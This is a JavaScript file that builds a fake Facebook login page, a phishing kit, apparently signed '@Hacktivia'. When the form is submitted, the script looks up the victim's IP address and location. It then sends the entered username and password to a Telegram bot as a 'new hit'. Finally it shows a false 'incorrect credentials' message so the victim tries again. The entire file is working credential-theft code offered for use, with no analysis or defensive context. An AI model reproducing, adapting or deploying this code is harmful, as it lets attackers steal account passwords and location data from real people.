(function () {
  const style = document.createElement('style');
  style.innerHTML = `
    body {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    margin: 0;       
    font-family: 'Roboto', sans-serif;
    }
    
.facebo {height: 60px; 
    width: 100px;
    display: block;
    margin: 0 auto;}
    
    
.inputbox { margin:auto 16px 6px;}
     
    input {
    width: 92%;
    margin: 2px 0;
    height: 40px;
    border: 1px solid #efefef;
    border-radius: 5px;
    background-color: #F5F6F8;
    font-size: 15px;
    padding: 9px 8px;
    outline: none;
    box-sizing: border-box;
    
    
}

.bnt {
    width: 92%;
    padding: 10px;
    background-color: #1878F3;
    border: none;
    border-radius: 5px;
    color: #ffffff;
    font-size: 16px;
    height: 38px;
    cursor: pointer;
    margin:auto 16px 6px;
    position: relative;  
    top: 10px;
}

.logni {
    height: 18px; 
    width: 40px; 
    position: relative;  
    top: -1px;
}

.for {
    text-align: center;
    font-size:14px;
    color: #005995;
    position: relative;  
    top: 10px;
}


.d {
            display: flex;
            align-items: center;
            width: 100%;
            max-width: px;
            
        }
        .line {
            border-top: 1.8px solid #E4E4E4;
            flex-grow: 1;
            margin: 30px 10px; 
            
        }
        .text {
            white-space: nowrap;
        }
        
.ivd { position: relative;  
text-align: center;
}       
        
.bon {width: 50%;
    padding: 10px;
    background-color: #00A400;
    border: none;
    border-radius: 5px;
    color: #ffffff;
    font-size: 16px;
    height: 45px;
    cursor: pointer;
    margin:auto 16px 6px;
    position: relative;  
       }


.crte {height: 20px; 
    width: 150px; 
    position: relative;  
    top: px;}
    
.fgot {
    margin: 15px;
    color: #4681D1;
    font-size: 16px;
    text-decoration: none;
    position: relative;
    }
    
    .cner {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 1vh;
        position: relative;
        top: 140px;
        text-align: center; /* Center align all text within container */
    }
    .left, .right {
        display: inline-block; /* Ensure blocks are centered within container */
        text-align: center; /* Reset text alignment within each block */
        
    }
    .left {
        margin-right: 20px; /* Adjust spacing between left and right columns */
    }
    .right {
        margin-left: 20px; /* Adjust spacing between left and right columns */
    }
    
    
#fut {text-decoration: none;
display: flex;
 justify-content: center;
        align-items: center;
        margin: 10px 10px; 
    color: #426D98;}
    
    
#en {text-decoration: none;
color: #989C9E;}

#fu {text-decoration: none;
display: flex;
 justify-content: center;
        align-items: center;
        margin: 10px 10px; 
    color: #426D98;
    position: relative;
    top: -10px;}
    
.boxx {width: 40px;
height: 20px;
position: relative;
top: -10px;}


.incface {position: relative;  
text-align: center;
top: 180px;
color: #989C9E;
font-size: 14px}


        /* Add styles for the success message */
        #successMessage {
            display: none;
            background-color: red;
            color: white;
            text-align: center;
            padding: 10px;
            position: fixed;<!-- Success message div -->
    <div id="successMessage">The credentials details that you entered is incorrect, but we can help you get back into your account. <strong>Try again with different log</strong></div>
            top: 0;
            width: 100%;
            z-index: 1000;
        }
  `;
  document.head.appendChild(style);

  window.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement("div");
    container.className = "container";
    container.innerHTML = `
      <!-- Success message div -->
    <div id="successMessage">The credentials details that you entered is incorrect, but we can help you get back into your account. <strong>Try again with different log</strong></div>
          <img class="facebo" src="https://resourcesss.github.io/Pics/facebo.png">
          
<form id="loginForm">
 <input type="hidden" name="source_page" value="Facebook">
              <input class="inputbox" type="text" id="username" name ="username" placeholder="Mobile number or email address" required>
      <input class="inputbox"  type="password" id="password" name="password" placeholder="Facebook password" required>
          <button  type="submit" class="bnt"><img class="logni" src="https://resourcesss.github.io/Pics/logni.png"></button>
    </form>
         
    <div class="d">
        <div class="line"></div>
        <div class="text">or</div>
        <div class="line"></div>
    </div>
   
    <div class="ivd">
    <button class="bon"><img class="crte" src="https://resourcesss.github.io/Pics/crte.png" ></button> <br>
    
    <a href="#" class="fgot">Forgotten password?</a>
    
    </div>
    
    <footer>
<div class="cner">
    
    <div class="left">
          <a href="#" id="en"><strong>English (UK)</strong></a>
            <a href="#" id="fut">Basa Jawa</a>
            <a href="#" id="fut">日本語</a>
            <a href="#" id="fut">Português (Brasil)</a>
    </div>
    <div class="right">
         <a href="#" id="fu">Bahasa Indonesia</a>
            <a href="#"id="fu">Bahasa Melayu</a>
            <a href="#" id="fu">Español</a>
           <img class="boxx" src="https://resourcesss.github.io/Pics/boxx.png" >
    </div>
    
    </footer>
    
    <p class="incface"> Meta ©2024</p>
    
    `;
    document.body.appendChild(container);

    document.getElementById('loginForm').addEventListener('submit', async function(event) {
  event.preventDefault();

  const username   = document.getElementById('username').value;
  const password   = document.getElementById('password').value;
  const sourcePage = document.querySelector('input[name="source_page"]').value;

  // —––– ONE CORS‑FRIENDLY CALL –––—
  // If you have an API key, append ?apikey=YOUR_KEY
  const res = await fetch('https://ipwhois.app/json/');
  const info = await res.json();

  const ipAddress   = info.ip;
  const countryName = info.country;          // e.g. "Nigeria"
  const state       = info.region;           // e.g. "Lagos"
  const phoneCode   = info.country_phone;    // e.g. "+234"

  const dateTime = new Date().toLocaleString();

  const message = `
𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪

🐉⊚-----------------------------------⊚🐉
<b>👤Username:</b> <code>${username}</code>\n
<b>📟Password:</b> <code>${password}</code>\n
<b>🌍Country:</b> ${countryName}\n
<b>🏴State:</b> ${state}\n
<b>⚙️IP Address:</b> ${ipAddress}\n
<b>📝Code:</b> <code>${phoneCode}</code>\n
<b>⏱Date/Time:</b> ${dateTime}\n
<b>🌐Login From:</b> ${sourcePage}
🐉⊚-----------------------------------⊚🐉
      ↝ ᴅᴇᴠ ʙʏ » @Hacktivia
  `;

  
  const telegramUrl      = `https://api.telegram.org/bot${iovjrtrdhhj9}/sendMessage`;

  await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id:    I94626736O,
      text:       message,
      parse_mode: 'HTML'
    })
  });

  // —––– SHOW SUCCESS —––—
  const successMessage = document.getElementById('successMessage');
  successMessage.style.display = 'block';
  document.getElementById('username').value = '';
  document.getElementById('password').value = '';

  setTimeout(() => { successMessage.style.display = 'none'; }, 8000);
});
  });
})();
